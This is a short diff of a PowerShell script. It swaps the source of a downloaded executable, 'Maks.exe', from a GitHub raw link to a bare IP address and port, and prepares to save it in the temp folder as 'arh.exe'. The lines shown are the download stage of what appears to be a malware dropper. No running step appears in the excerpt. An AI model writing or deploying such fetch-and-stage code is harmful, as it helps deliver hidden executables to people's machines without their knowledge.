@@ -1,4 +1,4 @@
-$url_file = 'http://raw.githubusercontent.com/MGrinx5/maks/refs/heads/main/Maks.exe'
+$url_file = 'http://46.8.230.129:8808/files/Maks.exe'
 $temp_folder = [System.IO.Path]::GetTempPath()
 $file = "$temp_folder\arh.exe"
 
